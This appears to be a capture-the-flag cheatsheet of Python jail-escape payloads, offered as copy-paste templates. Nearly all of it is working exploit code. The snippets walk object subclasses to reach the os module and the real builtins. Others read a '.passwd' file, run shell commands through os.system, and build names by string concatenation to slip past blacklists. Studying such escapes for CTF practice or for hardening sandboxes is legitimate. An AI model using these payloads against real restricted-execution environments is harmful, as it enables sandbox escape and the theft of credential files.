---
title: "Cheatsheet — Python Jail Payloads"
date: 2026-10-31
categories: [python-jail]
tags: [pyjail, python, security]
---
# Cheatsheet — Python Jail Payloads

Copy-paste templates. Replace indices/paths after reconnaissance.

## Object traversal

```python
subs = ().__class__.__base__.__subclasses__()
for i, c in enumerate(subs):
    try:
        g = c.__init__.__globals__
    except Exception:
        try:
            g = c.__init__.im_func.__globals__
        except Exception:
            g = None
    if g and "sys" in g:
        print(i, c)
```

```python
sysmod = g["sys"]
gcmod = sysmod.modules["gc"]
objs = gcmod.get_objects()
mainmod = [m for m in objs if type(m).__name__ == "module"
            and getattr(m, "__file__", None) == "/path/to/service.py"][0]
```

## warnings → linecache → os

```python
subs = ().__class__.__base__.__subclasses__()
# find warnings.catch_warnings by name
for i, c in enumerate(subs):
    if "catch_warnings" in repr(c):
        w = subs[i]
g = w.__init__.__globals__          # Py3
# g = w.__init__.im_func.__globals__  # Py2
lc = g.get("linecache")
osm = lc.__dict__.get("os")
```

## Code object inspection

```python
print(f.__code__.co_consts)         # Py3
print(f.func_code.co_consts)         # Py2
print(f.__code__.co_varnames)
```

## Dotless attribute access

```python
getattr(obj, dir(obj)[i])
list(mapping)
mapping[list(mapping)[i]]
```

## Staging under length limit

```python
__builtins__["B"] = __builtins__
B["u"] = B.update
u(o=().__class__.__base__)
u(subs=o.__subclasses__())
```

## type() context manager for traceback

```python
say_hello.found = []
def handler(self, t, v, tb):
    cur = tb
    while cur is not None:
        f = cur.tb_frame
        while f is not None:
            if "platform" in f.f_globals:
                say_hello.found.append(f.f_globals)
            f = f.f_back
        cur = cur.tb_next
    return True

M = type("M", (), {"__enter__": (lambda s: s), "__exit__": handler})
with M():
    1 / 0
```

## Read file via real builtins

```python
for g in say_hello.found:
    try:
        platform = g.get("platform")
        osmod = platform.os
        builtins = g.get("__builtins__")
        h = builtins.open(osmod.path.join(osmod.getcwd(), ".passwd"))
        print(h.read())
        h.close()
    except Exception:
        pass
```

## Format-string leak (text only)

```python
print("{0.__globals__}".format(say_hello))
print("{0.__globals__[platform].os}".format(say_hello))
```

## Python 2 input eval

```python
__import__('os').system("cat .passwd")
```

## Name building to evade blacklists

```python
mainmod.__dict__["get" + "_" + "your" + "_" + "keys"]
```

## XOR decode

```python
vals = [291105, 291152, ...]
key = 291171
print("".join(chr(x ^ key) for x in vals))
```

## Robust search helpers

```python
def find_subclass_with_global(key):
    for i, c in enumerate((().__class__.__base__.__subclasses__())):
        for getter in (lambda x: x.__init__.__globals__,
                       lambda x: x.__init__.im_func.__globals__):
            try:
                g = getter(c)
                if isinstance(g, dict) and key in g:
                    return i, c, g
            except Exception:
                pass
    return None
```

